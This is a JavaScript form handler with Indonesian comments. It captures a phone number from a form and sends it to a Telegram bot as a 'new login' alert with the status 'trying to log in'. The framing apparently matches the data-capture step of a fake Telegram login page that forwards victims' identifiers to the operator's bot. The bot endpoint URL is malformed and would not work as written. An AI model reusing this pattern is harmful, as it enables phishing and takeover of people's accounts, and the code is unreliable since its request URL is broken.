document.getElementById('telegramForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Mencegah halaman melakukan reload saat submit

    // Ambil nilai data dari input nomor telepon
    const inputPhone = document.getElementById('phoneNumber').value;
    const fullPhoneNumber = "+62 " + inputPhone;

    // Kredensial Bot Telegram (Silakan disesuaikan)
    const token = 'MOHON_ISI_TOKEN_BOT_ANDA'; 
    const chatId = 'MOHON_ISI_CHAT_ID_ANDA'; 

    // Format pesan teks yang akan dikirimkan ke Telegram
    const message = `🔔 *Notifikasi Login Baru*\n\n📱 *Nomor Telepon:* ${fullPhoneNumber}\n🌐 *Status:* Mencoba Masuk`;

    // URL API Telegram untuk mengirim pesan dokumen/teks
    const url = `https://telegram.org{token}/sendMessage`;

    // Kirim data menggunakan Fetch API ke bot Telegram
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown' // Mengaktifkan format teks tebal/miring
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Formulir berhasil dikirim ke Telegram!');
            document.getElementById('telegramForm').reset(); // Reset form setelah sukses
        } else {
            alert('Terjadi kesalahan saat mengirim data.');
            console.error(data);
        }
    })
    .catch(error => {
        alert('Gagal terhubung ke server Telegram.');
        console.error('Error:', error);
    });
});
